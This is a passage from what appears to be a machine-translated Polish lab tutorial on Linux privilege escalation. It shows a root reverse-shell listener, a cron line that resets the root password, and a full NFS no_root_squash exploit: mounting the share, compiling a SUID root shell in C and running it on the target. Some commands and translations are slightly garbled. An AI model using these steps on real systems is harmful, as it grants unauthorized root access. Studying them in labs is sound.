Przychodzące połączenie powłoki odwrotnej ma uprawnienia roota:

Rozpocznij nasłuchiwanie
root@10.130.126.128:~# nc -nlvp 7777
listening on [any] 6666 ...
connect to [10.130.126.128] from (UNKNOWN) [10.130.135.215] 59838
bash: cannot set terminal process group (7275): Inappropriate ioctl for device
bash: no job control in this shell
id
uid=0(root) gid=0(root) groups=0(root)
Innym sposobem wykorzystania tej luki jest po prostu zmiana hasła roota poprzez dodanie poniższego wiersza do podatnego skryptu.

echo "root:newpass" | chpasswd

Następnie po uruchomieniu zadania możesz po prostu zalogować się jako root, dzwoniąc sui podając nowe hasło.

Jeśli kiedykolwiek natkniesz się na istniejący skrypt lub zadanie powiązane z zadaniem cron, zawsze warto poświęcić czas na zrozumienie funkcji skryptu i sposobu użycia danego narzędzia w danym kontekście. Na przykład, tar, 7z, rsync, itd. mogą zostać wykorzystane za pomocą funkcji symbolu wieloznacznego.

Chociaż często znajdziesz zadania cron w /etc/crontab, nie jest to jedyne miejsce, w którym można je zdefiniować. Inne lokalizacje to:

/etc/cron.d/— katalog dla fragmentów crontab, zazwyczaj używanych przez pakiety. Ten sam format co /etc/crontab(zawiera pole użytkownika).
/etc/cron.hourly/— tutaj skrypty są uruchamiane raz na godzinę.
/etc/cron.daily/— skrypty tutaj są uruchamiane raz dziennie.
/etc/cron.weekly/— skrypty tutaj są uruchamiane raz w tygodniu.
/etc/cron.monthly/— skrypty tutaj są uruchamiane raz w miesiącu.
/var/spool/cron/crontabs/(Debian/Ubuntu) — osobisty plik crontab każdego użytkownika znajduje się tutaj jako plik o nazwie pochodzącej od użytkownika.
Następnie będziesz musiał wykorzystać podobną lukę w zabezpieczeniach systemu docelowego.

Wektory eskalacji uprawnień nie ograniczają się do dostępu wewnętrznego. Foldery współdzielone i interfejsy zdalnego zarządzania, takie jakSSHTelnet może również pomóc Ci uzyskać dostęp do roota w systemie docelowym. W niektórych przypadkach konieczne będzie również użycie obu wektorów, np. znalezienie rootaSSHklucza prywatnego w systemie docelowym i połączenia za pośrednictwemSSHz uprawnieniami roota zamiast próbować zwiększyć poziom uprawnień bieżącego użytkownika.

Innym wektorem jest błędnie skonfigurowana powłoka sieciowa. Ten wektor można czasami zaobserwować podczas testów penetracyjnych, gdy obecny jest system zapasowy sieci.

Konfiguracja NFS (Network File Sharing – udostępnianie plików sieciowych) jest przechowywana w /etc/exportspliku. Plik ten jest tworzony podczas instalacji serwera NFS i zazwyczaj może być odczytany przez użytkowników. 

Informacja: Udziały w przykładach tego zadania i te, które będą Twoimi celami, mogą się różnić.

kot /etc/exports
john@nfs-box:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/mnt/sharedfolder *(rw,sync,insecure,no_subtree_check)
/backups *(rw,sync,insecure,no_root_squash,no_subtree_check)
Kluczowym elementem tego wektora eskalacji uprawnień jest opcja no_root_squash , którą widać powyżej. Domyślnie NFS zmienia użytkownika root na nfsnobody, uniemożliwiając działanie dowolnego pliku z uprawnieniami roota. Jeśli opcja no_root_squash jest obecna w udziale zapisywalnym, możemy utworzyć plik wykonywalny (który byłby własnością roota) z ustawionym bitem SUID i uruchomić go w systemie docelowym.

Na początek należy wyliczyć udziały docelowe na komputerze atakującym.

Wyświetlanie udostępnień zdalnie
root@10.130.126.128:~# showmount -e 10.130.135.215
Export list for 10.130.135.215:
/backups          *
/mnt/sharedfolder *
/tmp              *
Następnie możesz zamontować jeden z udziałów no_root_squash na atakującym komputerze i rozpocząć tworzenie pliku wykonywalnego.

Udostępnij mocowanie
root@10.130.126.128:~# mkdir /tmp/backupsonattackermachine
root@10.130.126.128:~# mount -o rw 10.130.135.215:/backups /tmp/backupsonattackermachine
root@10.130.126.128:~# cd /tmp/backupsonattackermachine
Ponieważ można ustawić bity SUID, prosty plik wykonywalny, który zostanie uruchomiony /bin/bashw systemie docelowym, wykona zadanie.

Zawartość pliku C
int main() {
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}
Po skompilowaniu kodu można ustawić bit SUID. 

Informacja: Należy również upewnić się, że właścicielem pliku jest root (tj. root:root).

Zdalne przesyłanie exploitów
root@10.130.126.128:/tmp/backupsonattackermachine# gcc nfs.c -o nfs -w -static
root@10.130.126.128:/tmp/backupsonattackermachine# chmod +s nfs
root@10.130.126.128:/tmp/backupsonattackermachine# ls -l nfs
-rwsr-sr-x 1 root root 16712 Jun 17 16:24 nfs
Poniżej zobaczysz, że oba pliki ( nfs.ci nfs) są obecne w systemie docelowym. Jeśli znajdujesz się w zamontowanym udziale, nie ma potrzeby ich przenoszenia.

Następnie możesz powrócić do miejsca docelowego i uruchomić przesłany plik binarny.

Wyzwalanie exploita na celu
john@nfs-box:~$ id
john@nfs-box:~$ whoami
john
john@nfs-box:/backups$ ls -l
total 24
-rwsr-sr-x 1 root root 16712 Jun 17 16:24 nfs
-rw-r--r-- 1 root root    76 Jun 17 16:24 nfs.c
john@nfs-box:~$ ./nfs
root@nfs-box:~# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(alper)
root@nfs-box:~# whoami
root
Należy pamiętać, że plik wykonywalny nfs ma ustawiony bit SUID na systemie docelowym i działa z uprawnieniami roota.

Następnie będziesz musiał wykorzystać podobną lukę w zabezpieczeniach systemu docelowego.

W tym pokoju przeanalizowałeś najczęstsze błędy w konfiguracji, które zmieniają zwykły Linux użytkownika na roota.

Nadużyłeś zbyt pobłażliwych reguł sudo, aby uruchamiać polecenia uprzywilejowane jako inny użytkownik.
Wyszukałeś pliki binarne SUID, które wykonują się jako ich właściciel i zamieniłeś je w powłoki.
Przejąłeś zmienną środowiskową PATH, aby oszukać uprzywilejowane skrypty i zmusić je do uruchomienia plików binarnych kontrolowanych przez atakującego.
Wykorzystałeś Linux możliwości pozostawione w niewłaściwych plikach wykonywalnych.
Nadużyłeś zapisywalnych zadań cron uruchamianych jako root.
Wykorzystałeś błędnie skonfigurowany udział NFS z opcją no_root_squash, aby zainstalować plik binarny SUID należący do użytkownika root na swoim komputerze.
Wspólny mianownik wszystkich tych przypadków jest taki sam: eskalacja uprawnień rzadko wynika z pojedynczego, drastycznego błędu; wynika ona z drobnego błędu w konfiguracji, który daje ci coś, czego nie powinieneś mieć. Dokładnie wylicz i sprawdź uprawnienia wszystkiego, co działa jako inny użytkownik, a ścieżka prowadząca do celu prawie zawsze sama się ujawni.

Następnie w Linux Eskalacja uprawnień: Sala automatyzacji – przyjrzymy się automatyzacji procesu enumeracji i uruchamianiu publicznych ataków.
